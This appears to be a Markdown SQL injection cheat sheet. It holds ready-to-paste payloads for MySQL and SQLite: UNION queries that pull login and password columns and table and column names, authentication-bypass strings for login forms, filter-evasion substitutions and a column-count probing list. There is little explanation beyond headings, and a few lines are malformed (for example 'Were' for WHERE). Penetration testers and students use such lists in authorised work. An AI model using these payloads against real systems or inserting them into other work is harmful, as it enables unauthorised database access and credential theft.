# SQLi 
#### Command characters are (#, /**/, ;, —)

##### Note: We can use the following code to make it true

    ("or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/")
    
    
    AND   -> && -> %26%26
    OR    -> || -> %7C%7C
    =     -> LIKE,REGEXP,RLIKE, not < and not >
    > X   -> not between 0 and X
    WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))

    
..............................................................................
# MySQL

    ' union select login,password from users-- -
    ' union all select 1, (select password from users) -- 
    ' UNION SELECT 2, table_name from INFORMATION_SCHEMA.tables --
    ' UNION SELECT 1, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS --
    ' UNION SELECT 2, group_concat(table_name) from INFORMATION_SCHEMA.TABLES --
    ' UNION SELECT 1, group_concat(COLUMN_NAME), FROM INFORMATION_SCHEMA.COLUMNS --
    ' UNION SELECT 2, group_concat(table_name) from INFORMATION_SCHEMA.tables where table_SCHEMA=database()-- -
    ' union select 1, GROUP_CONCAT(login SEPARATOR ', '), GROUP_CONCAT(password SEPARATOR ', ') FROM users# –– -
    ' UNIon SELect 1, (SELect GROup_CONcat(COLumn_NAMe) FROm INFormation_SCHema.COLumns WHEre TABle_NAMe='users')-- -
    ' UNIon SELect 1, (SELect GROup_CONcat(TABle_NAMe) FROm INFormation_SCHema.TABles WHEre TABle_SCHema=DATabase())-- -
    ' union select table_name, GROUP_CONCAT(column_name SEPARATOR ', ') FROM information_schema.columns where table_name = 'users'# –– -
    
..............................................................................
 
    user=admin' ;&pass=a 
    user=admin' --&pass=a
    user=admin' /*&pass=a
    adm'||'in &Pass=' glob '*
    user=ad'||'min'%00&pass=1'+||+'1
    user:ad'||'min pass:a' IS NOT 'b
    user=1' OR '1'='1%00&pass=a
    user=admin' OR '1'='1';&pass=a
    user=admin' OR '1'='1'--&pass=a
    user=admin' OR '1'='1'/*&pass=a
    user=admin&pass=a'/**/IS/**/NOT/**/'b
    user='admi'||CHAR(' AND pass='-0+110)||''
    user=adm' ||   trim('in', Password: )  || '&pass=a
    user=admin' union select * from users where '1&pass=a
    user=' union select * from users where username in("admin")/*&pass=a
    user=mali'/**/union/**/SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;&pass=a
    User='/**/union/**/select*from/**/users/**/where/**/username/**/in(char(97,100,109,105,110))/*&pass=a

.....................................................................................
# For SQLi (SQLite)

    1' || (select sqlite_version()));--
    1' || (SELECT sql FROM sqlite_master));--
    'union select sqlite_version() -- -
    123' UNION SELECT 1, sqlite_version(), 3;--
    ' UNION SELECT table_name FROM sqlite_master --
    123' UNION SELECT name, sql, null from sqlite_master;--
    ' UNION SELECT null, sql FROM sqlite_master WHERE type='view' --
    ' UNION SELECT null, sql FROM sqlite_master WHERE type='index' --
    ' UNION SELECT null, sql FROM sqlite_master WHERE type='trigger' --
    ' UNION SELECT null, table_name FROM pragma_table_info('sqlite_master') --
    ' UNION SELECT group_concat(name) FROM sqlite_master WHERE type='table' --
    ' UNION SELECT null, sql FROM sqlite_master WHERE type='view' AND sql NOT NULL --
    ' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='your_table' --
    ' UNION SELECT null, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL --
    ' UNION SELECT null, sql FROM sqlite_master WHERE type='index' AND sql NOT NULL --
    ' UNION SELECT null, sql FROM sqlite_master WHERE type='trigger' AND sql NOT NULL --
    ' UNION SELECT null, name FROM pragma_module_list() WHERE name NOT LIKE 'sqlite_%' --
    ' UNION SELECT null, name FROM pragma_function_list() WHERE name NOT LIKE 'sqlite_%' --
    ' UNION SELECT tbl_name FROM sqlite_master WHERE TYPE='table' AND tbl_name NOT LIKE'sqlite_%'
    ' UNION SELECT null, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name' --
    ' UNION SELECT null, sql FROM sqlite_master WHERE type='table' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' --
    ' UNION SELECT group_concat(sql) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name' --
### The structure of the command code to create the desired payload is as follows
        'union select <column> FROM <table_name> Were <conditions > --
    
        
.....................................................................................................................
    
    ' UNION SELECT NULL --
    ' UNION SELECT 1 --
    ' UNION SELECT 'a' --
    ' UNION SELECT 'a', 'b' --
    ' UNION SELECT 'a', 'b', 'c' --
    ' UNION SELECT 'a', 'b', 'c', 'd' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0' --
    ' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1' --
